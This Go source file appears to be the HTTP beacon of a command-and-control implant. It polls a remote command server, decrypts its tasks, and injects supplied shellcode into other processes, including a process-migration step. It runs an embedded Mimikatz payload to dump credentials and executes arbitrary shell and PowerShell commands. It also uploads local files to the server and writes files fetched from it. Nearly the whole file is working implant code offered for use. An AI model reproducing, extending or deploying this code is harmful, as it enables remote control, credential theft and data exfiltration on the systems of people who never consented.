package main

import (
	"os"
	"io"
	"fmt"
	"bufio"
	"bytes"
	"strconv"
	"os/exec"
	"strings"
	"runtime"
	"net/http"
	"encoding/hex"
	"encoding/json"
    "mime/multipart"
	b64 "encoding/base64"
	ps "github.com/mitchellh/go-ps"
)

func (packet BeaconHttp) exitHandler() {
	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"quit",[]byte("quit")})
	debugFatal(err)
	encoded := b64.StdEncoding.EncodeToString(data)
	queryCommandHttp(encoded)
	os.Exit(1)
}

func (packet BeaconHttp) queryServer() {
	resp, err := queryCommandHttp(string(packet.data))
	debugFatal(err)

	if err == nil {
		defer resp.Body.Close()

		if err != nil || resp.Status != "200 OK" {
			fmt.Println("Command status != 200: " + resp.Status)
		}
		
		controlDataBytes, err := io.ReadAll(resp.Body)
		debugFatal(err)
		encData, _ := b64.StdEncoding.DecodeString(string(controlDataBytes))
		data := securityContext.decrypt(encData)

		var beaconMsg BeaconMessage
		var commResp CommandResponse
		json.Unmarshal([]byte(data), &beaconMsg)
		fmt.Println(beaconMsg.Data)
		beaconData, err := b64.StdEncoding.DecodeString(beaconMsg.Data)
		beaconRoute, err := b64.StdEncoding.DecodeString(beaconMsg.Route)
		
		if err != nil {
			debugFatal(err)
			return
		}
		
		json.Unmarshal(beaconData, &commResp)

		if len(beaconRoute) > 0 {
			if beaconRoute[0] == 0 {
				json.Unmarshal([]byte(beaconData), &commResp)
				packet.handleQueryResponse(commResp)
			}
		}
	} else if debug {
		fmt.Println("Couldn't reach command.")
	}
}

func (packet BeaconHttp) addProxyClient(client Beacon) {
	packet.proxyClients = append(packet.proxyClients, client)
}

func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + endpoint
	req, err := http.NewRequest("GET", url, nil)
	debugFatal(err)
	req.Host = cmdHost
	return netClient.Do(req)
}

func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
	for i := 0; i < len(commResp.Shellcode); i += 2 {
		var output string
		procId := -1
		shellcode := commResp.Shellcode[i]
		procInfo := strings.Split(commResp.Shellcode[i+1], " ")
		
		if procInfo[0] != "module" {
			procId, _ = strconv.Atoi(procInfo[1])
		}
		
		decodedShellcode, err := b64.StdEncoding.DecodeString(shellcode)

		if err != nil {
			debugFatal(err)
			continue
		}

		if procInfo[0] != "module" {
			si := RemoteShellcodeInjector { decodedShellcode, procId }
			err := si.inject()
			if err != nil {
				output = err.Error()
			} else {
				output = ""
			}
		} else {
			si := RemotePipedShellcodeInjector { decodedShellcode, strings.Join(procInfo[1:], " ") }
			output = si.inject()
		}
		
		var data []byte
				
		if procInfo[0] == "migrate" {
			var msg string
			if err == nil || err.Error() == "The operation completed successfully." {
				msg = "Success"
				defer packet.exitHandler()
			} else {
				msg = err.Error()
			}

			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"migrate",[]byte(msg)})
		} else if procInfo[0] == "module" {
			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
		} else {
			data, err = json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"inject",[]byte(output)})
		}

		debugFatal(err)
	 	encoded := b64.StdEncoding.EncodeToString(data)
		queryCommandHttp(encoded)
	
	}

	for _, file := range commResp.Download {
		packet.upload(file)
	}

	for _, file := range commResp.Upload {
		packet.download(file)
	}

	for _, client := range commResp.ProxyClients {
		var beacon Beacon
		json.Unmarshal([]byte(client), &beacon)
		fmt.Println("Adding proxy " + beacon.Id)
		packet.addProxyClient(beacon)
	}

	for _, cmd := range commResp.Exec {
		cmdSplit := strings.Fields(cmd);
		output := []byte{}
		
		if cmdSplit[0] == "exit" || cmdSplit[0] == "quit" {
			packet.exitHandler()
		}

		if cmdSplit[0] == "mimikatz" {
			data, _ := hex.DecodeString(mimikatzShellcode)
			injector := RemotePipedShellcodeInjector { 
				shellcode: data,
				args: strings.Join(append(cmdSplit[0:], "exit"), " "),
			}

			out := injector.inject()
			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"mimikatz",[]byte(out)})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
			return
		}

		if cmdSplit[0] == "plist" {
			procs := "------------------------------\nPID\tPPID\tName\n------------------------------"
			procList, _ := ps.Processes()
			
			for _, p := range procList {
				procs += "\n" + strconv.Itoa(p.Pid()) + "\t" + strconv.Itoa(p.PPid()) + "\t" + p.Executable()
			}

			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"plist",[]byte(procs)})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
			return
		}
		
		var cmdHandle *exec.Cmd

		if runtime.GOOS == "linux" {
			command := []string{ "-c", cmd }
			cmdHandle = exec.Command("/bin/sh", command...)
		} else if runtime.GOOS == "windows" {
			command := []string { "-c", cmd }
			cmdHandle = exec.Command("powershell", command...)
		}

		stderr, err := cmdHandle.StderrPipe()
		stdout, err := cmdHandle.StdoutPipe()
		
		if err = cmdHandle.Start(); err == nil {
			scanner := bufio.NewScanner(stderr)
			
			if err != nil {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			for scanner.Scan() {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			scanner = bufio.NewScanner(stdout)
			
			if err != nil {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}

			for scanner.Scan() {
				output = append(output, scanner.Text()...)
				output = append(output, '\n')
			}
		}
		
		if len(output) > 0 {
			data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"exec",output})
			debugFatal(err)
			encoded := b64.StdEncoding.EncodeToString(data)
			queryCommandHttp(encoded)
		}
	}
}

func (packet BeaconHttp) download(filePath string) {
	filename := filePath
	if filename[0] == '/' || filename[0] == '~' {
		f := strings.Split(filename, "/")
		filename = f[len(f)-1]
	}

	result := "0"

	url := "http://" + cmdAddress + ":" + cmdPort + "/d/" + b64.StdEncoding.EncodeToString([]byte(filePath))
	req, err := http.NewRequest("GET", url, nil)
	debugFatal(err)
	req.Host = "command.com"
	resp, err := netClient.Do(req)
	fmt.Println(url)
	debugFatal(err)
	defer resp.Body.Close()
	targetDir := ""

	for _, loc := range writeCheckLocations {
		out, err := os.Create(loc + "/" + filename)
		debugFatal(err)

		if err != nil {
			continue
		}

		defer out.Close()

		_, err = io.Copy(out, resp.Body)
		debugFatal(err)
		
		if err != nil {
			continue
		}

		result = "1"
		targetDir = loc
		break
	}

	result += ";" + targetDir + "/" + filename

	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"upload", []byte(result)})
	debugFatal(err)
	
	if err != nil {
		return
	}

	encoded := b64.StdEncoding.EncodeToString(data)
	queryCommandHttp(encoded)
}

func (packet BeaconHttp) upload(filename string) {
	data, err := json.Marshal(CommandUpdate{ip,id,curUser,platform,arch,pid,pname,"upload", []byte(filename)})
	debugFatal(err)
	
	if err != nil {
		return
	}

	encoded := b64.StdEncoding.EncodeToString(data)
	url := "http://" + cmdAddress + ":" + cmdPort + "/" + encoded
	
    var b bytes.Buffer
    w := multipart.NewWriter(&b)
    var fw io.Writer
    file, err := os.Open(filename)
    debugFatal(err)
	
	if err != nil {
		return
	}
	if fw, err = w.CreateFormFile("file", file.Name()); err != nil {
    	debugFatal(err)
		return
    }    
	if _, err = io.Copy(fw, file); err != nil {
		debugFatal(err)
		return
    }

    w.Close()

	req, err := http.NewRequest("POST", url, &b)
	req.Host = cmdHost
	debugFatal(err)
	req.Header.Set("Content-Type", w.FormDataContentType())
    _, err = netClient.Do(req)
	debugFatal(err)
}